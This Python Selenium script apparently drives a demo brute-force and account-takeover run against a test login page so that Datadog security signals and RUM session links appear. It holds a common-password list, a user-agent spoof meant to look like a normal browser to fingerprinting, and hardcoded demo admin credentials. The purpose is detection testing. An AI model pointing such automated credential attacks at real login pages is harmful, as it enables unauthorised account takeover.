"""
Selenium-driven brute force + ATO against the demo login page.

Why a browser instead of curl?
  - Exercises the FULL stack: ALB → Nginx → Flask → ddtrace AppSec.
  - Loads the RUM SDK in each session, so AAP signals get correlated with
    Datadog RUM sessions and session replays — clicking from an AAP "Bruteforce
    attack" signal into the user's recorded clicks is the highlight differentiator.
  - Each browser-driven attempt is a real HTTP request originating from JS,
    not a synthetic curl, so business-logic events look exactly like a real attack.

Usage:
    pip install -r scripts/requirements.txt          # selenium + webdriver-manager
    python scripts/ato_browser_attack.py             # full demo (40+ fails, then a success)
    python scripts/ato_browser_attack.py --headless  # invisible browser
    python scripts/ato_browser_attack.py --attempts 20 --user admin

Prereqs:
  - Your public IP must be in k8s/ingress.yaml allowlist.
  - Chrome/Chromium installed locally (webdriver-manager auto-downloads driver).
"""

import argparse
import sys
import time

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait

DEFAULT_URL = "https://mcse-dogwiki.com/login"
DEFAULT_USER = "admin"
DEFAULT_GOOD_PASSWORD = "admin123"

# Top passwords used in real-world credential stuffing lists
PASSWORD_LIST = [
    "password", "123456", "12345678", "qwerty", "abc123", "111111", "1234567",
    "letmein", "monkey", "admin", "welcome", "1234567890", "iloveyou", "dragon",
    "master", "shadow", "superman", "qwertyuiop", "michael", "ninja", "mustang",
    "access", "freedom", "654321", "555555", "666666", "ashley", "7777777",
    "fuckyou", "121212", "000000", "charlie", "aa123456", "donald", "password1",
    "qwerty123", "trustno1", "batman", "passw0rd", "hunter2", "ncc1701",
]


def build_driver(headless: bool) -> webdriver.Chrome:
    opts = Options()
    if headless:
        opts.add_argument("--headless=new")
    opts.add_argument("--window-size=1280,800")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-dev-shm-usage")
    # Realistic UA so threat-intel / fingerprinting sees a normal browser, not "HeadlessChrome"
    opts.add_argument(
        "user-agent=Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
        "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
    )
    return webdriver.Chrome(options=opts)


def submit_login(driver, url: str, user: str, password: str, wait: WebDriverWait) -> str:
    driver.get(url)
    username_field = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, '[data-testid="login-username"]')))
    password_field = driver.find_element(By.CSS_SELECTOR, '[data-testid="login-password"]')
    submit_btn    = driver.find_element(By.CSS_SELECTOR, '[data-testid="login-submit"]')

    username_field.clear()
    password_field.clear()
    username_field.send_keys(user)
    password_field.send_keys(password)
    submit_btn.click()

    # Wait either for an error message (failure) or a navigation away from /login (success)
    try:
        WebDriverWait(driver, 5).until(
            lambda d: d.find_elements(By.CSS_SELECTOR, '[data-testid="login-error"]')
                      or "/login" not in d.current_url
        )
    except Exception:
        return "timeout"

    if driver.find_elements(By.CSS_SELECTOR, '[data-testid="login-error"]'):
        return "fail"
    return "success"


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--url",      default=DEFAULT_URL)
    ap.add_argument("--user",     default=DEFAULT_USER)
    ap.add_argument("--good-pw",  default=DEFAULT_GOOD_PASSWORD,
                    help="Correct password used for the final success attempt (set to '' to skip the ATO step)")
    ap.add_argument("--attempts", type=int, default=len(PASSWORD_LIST),
                    help="Number of failed attempts to make before the final success")
    ap.add_argument("--headless", action="store_true")
    ap.add_argument("--pause",    type=float, default=0.4, help="Delay between attempts (s)")
    args = ap.parse_args()

    print(f"Target:      {args.url}")
    print(f"User:        {args.user}")
    print(f"Attempts:    {args.attempts} (then 1 success)" if args.good_pw else f"Attempts: {args.attempts}")
    print(f"Headless:    {args.headless}")
    print()

    driver = build_driver(args.headless)
    wait = WebDriverWait(driver, 10)
    fails = 0
    try:
        for i, pw in enumerate(PASSWORD_LIST[: args.attempts]):
            result = submit_login(driver, args.url, args.user, pw, wait)
            marker = {"fail": "✗", "success": "✓", "timeout": "?"}[result]
            print(f"  [{i+1:02d}/{args.attempts}] {marker} {args.user}:{pw}  → {result}")
            if result == "fail":
                fails += 1
            time.sleep(args.pause)

        if args.good_pw:
            print()
            print(f"  >>> ATO step — submitting correct credentials ({args.user}:{args.good_pw})")
            result = submit_login(driver, args.url, args.user, args.good_pw, wait)
            print(f"      result: {result}")

        print()
        print(f"Done. {fails} failed login(s) submitted via the browser.")
        print("Check Datadog UI:")
        print("  • Security → App and API Protection → Signals (Bruteforce, Credential Stuffing)")
        print("  • RUM → Sessions  (look for sessions from this run; each AAP signal links here)")
        return 0
    finally:
        driver.quit()


if __name__ == "__main__":
    sys.exit(main())
